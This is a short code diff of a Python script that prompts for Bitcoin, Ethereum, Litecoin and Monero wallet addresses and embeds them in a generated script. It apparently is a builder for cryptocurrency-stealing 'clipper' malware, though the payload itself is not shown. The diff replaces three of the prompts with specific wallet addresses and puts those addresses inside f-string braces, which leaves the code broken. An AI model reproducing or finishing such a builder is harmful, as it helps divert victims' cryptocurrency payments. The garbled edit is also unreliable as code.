@@ -14,16 +14,16 @@ print("""
 
 
 
-BITCOIN_ADDRESS = input("YOUR BITCOIN ADDRESS:\n[>>>]")
-ETHEREUM_ADDRESS = input("YOUR ETHEREUM ADDRESS:\n[>>>]")
-LITECOIN_ADDRESS = input("YOUR LITECOIN ADDRESS:\n[>>>]")
+BITCOIN_ADDRESS = input("bc1qazuyct8sn2j6felfastxz7n3jp03hn8svfk4d5:\n[>>>]")
+ETHEREUM_ADDRESS = input("0xa9Fb394F963a72E992688E91eB94Fce381819387:\n[>>>]")
+LITECOIN_ADDRESS = input("ltc1qp697g9ynmrz9n4hsdqvm96w5yd3hk5nhpascq0:\n[>>>]")
 MONERO_ADDRESS = input("YOUR MONERO ADDRESS:\n[>>>]")
 
 addresses = f"""
-BTC_address = "{BITCOIN_ADDRESS}"
-ETH_address = "{ETHEREUM_ADDRESS}"
+BTC_address = "{bc1qazuyct8sn2j6felfastxz7n3jp03hn8svfk4d5}"
+ETH_address = "{0xa9Fb394F963a72E992688E91eB94Fce381819387}"
 MON_address  = "{MONERO_ADDRESS}"
-LTC_address = "{LITECOIN_ADDRESS}"
+LTC_address = "{ltc1qp697g9ynmrz9n4hsdqvm96w5yd3hk5nhpascq0}"
 """
 python_script = """
 import os
